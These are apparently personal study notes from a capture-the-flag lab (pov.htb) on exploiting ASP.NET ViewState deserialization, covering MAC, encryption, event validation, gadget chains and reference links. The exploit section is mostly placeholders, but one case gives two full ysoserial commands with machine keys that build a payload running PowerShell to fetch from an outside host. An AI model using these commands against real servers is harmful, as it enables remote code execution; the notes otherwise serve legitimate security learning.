



- ViewState deserialization:
	- TODO: 
		- Build iis lab
		- Solve --path --apppath --generator problem
		- Important flag: --isdebug --islegacy to guess --path --apppath
		- gaget-chain: 
			- TextFormattingRunProperties #==> shorter payload
			- TypeConfuseDelegate
			- WindowsIdentity
			- PSObject ==> not wotk yet
			
		
	- Seen: pov.htb,
	- Note:
		- ViewState:
			- Param: _VIEWSTATE
			- The view state is the state of the page and all its controls. It is automatically maintained across posts by the ASP.NET framework. #==> need more test
			- The ViewState is in the form of a serialized data which gets deserialized when sent to the server during a postback action(POST method). #==> need debug this
			- Libraries(serializing and deserializing): ObjectStateFormatter, LOSFormatter, BinaryFormatter, ... #==> need test
			- Serializing: LosFormatter #==> by default ??? can i change this ???
			- Deserialized: ObjectStateFormatter #==> by default ??? can i change this ???
			- Options:
				- Message Authentication Code(MAC):
					- web.config: <page enableViewStateMac=”true” /> #==> default setting for project 
					- aspx: <%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%> #==> only this file
					- ViewState tamper free dueto integrity check (machineKey tag in web.config)
						- validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
						- alidation="SHA1"
					
				
				- Encryption:
					- web.config: <page ViewStateEncryptionMode=”Always”/>
					- aspx: #==> not sure are there options same as MAC ???
					- ViewState encrypt / validate algorithms (machineKey tag in web.config)
						- decryption="AES" 
						- decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
					
					
			
		- EventValidation: #==> not touching so far | generate all possible allow POST data in theoretical
			- Param: __EVENTVALIDATION
			- Error: Invalid Callback Or Postback Argument
			- ASP.NET 2.0 added a feature called event validation. Event validation checks the incoming values in a POST to ensure the values are known, good values. If the runtime sees a value it doesn’t know about, it throws an exception
			
		- ViewStateUserKey: #==> not so sure where is this need more test but work as csrf
			- System.Web.UI.Page.ViewStateUserKey
			- ValidateAntiForgeryToken 
			- ref: https://blogs.objectsharp.com/post/2010/04/08/ViewStateUserKey-ValidateAntiForgeryToken-and-the-Security-Development-Lifecycle.aspx
			
		- Formatters: #==> not sure about this
			- Formatters are used for converting data from one form to another. 
			- E.g: a BinaryFormatter serializes and deserializes an object, or an entire graph of connected objects, in binary format
			
		- Gadgets: 
			- Classes that may allow execution of code when an untrusted data is processed by them.
			- Eg: PSObject, TextFormattingRunProperties, TypeConfuseDelegate, ... #==> TextFormattingRunProperties, TypeConfuseDelegate => work on pov.htb| PSObject => not wotk so far

			
	- Exploit:
		- Target framework <=4.0 (ViewState Mac is disabled):
			- Seen: TBD
			
			
			
			
		- Target framework <=4.0 (ViewState Mac is disabled + ViewState is removed from the HTTP request):
			- Seen: TBD
		
		
		
		
		- Target framework <=4.0 (ViewState Mac is enabled):
			- Seen: TBD
		
		
		
		
		- Target framework <=4.0 (Encryption is enabled for ViewState)
			- Seen: pov.htb,
			- Eg: 
				./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ”powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/exp” --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"

				./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/exp" --generator=37310E71 — decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" #==> generator not work but --path + --apppath do work need more test 
			
				
		- Target framework is >=.NET 4.5
			- Seen: TBD
		
		
		
		
		- Target framework is >=.NET 4.5 + ViewStateUserKey is being used
			- Seen: TBD
		
		
		
		
		
		
			
	- Ref:
		https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#what-is-viewstate
		https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
		https://medium.com/@dub-flow/deserialization-what-the-heck-actually-is-a-gadget-chain-1ea35e32df69
		https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2022
		https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net
		https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/
			
	- New chain: https://y4er.com/posts/dotnet-new-gadget/
				https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md
	- Researcher: https://github.com/Y4er